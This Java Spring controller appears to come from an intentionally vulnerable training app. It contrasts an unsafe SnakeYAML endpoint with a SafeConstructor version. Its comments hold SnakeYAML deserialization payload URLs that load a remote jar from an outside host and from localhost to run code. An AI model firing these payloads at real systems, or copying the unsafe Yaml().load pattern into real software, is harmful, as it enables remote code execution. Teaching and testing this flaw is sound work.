package com.madaha.codesecone.controller.rce;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

@RestController
@RequestMapping("/RCE/yaml")
public class YamlVul {
    /**
     * YAML远程类加载 -- >本地RCE命令执行
     * 下面这部分是 java-sec-code::RCE.java 的一段代码
     *
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */


    /**
     * 恶意命令执行payload：
     *    http://127.0.0.1:28888/RCE/yaml/vul?content=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:8000/yaml-payload.jar"]]]]
     *
     * url 编码：
     *    http://127.0.0.1:28888/RCE/yaml/vul?content=!!javax.script.ScriptEngineManager%20%5B!!java.net.URLClassLoader%20%5B%5B!!java.net.URL%20%5B%22http://127.0.0.1:8000/yaml-payload.jar%22%5D%5D%5D%5D
     *
     * poc 命令执行不成功，有点问题：
     *    @poc http://127.0.0.1:28888/RCE/yaml/vul?content=http://127.0.0.1:28888/RCE/yaml/vul?content=!!javax.script.ScriptEngineManager%20%5B!!java.net.URLClassLoader%20%5B%5B!!java.net.URL%20%5B%22http://127.0.0.1:8000/yaml-payload.jar%22%5D%5D%5D%5D
     *
     *
     * @param content
     */
    @GetMapping("/vul")
    public void yarm(String content) {
        Yaml y = new Yaml();
        y.load(content);
    }

    @GetMapping("/safe")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

}
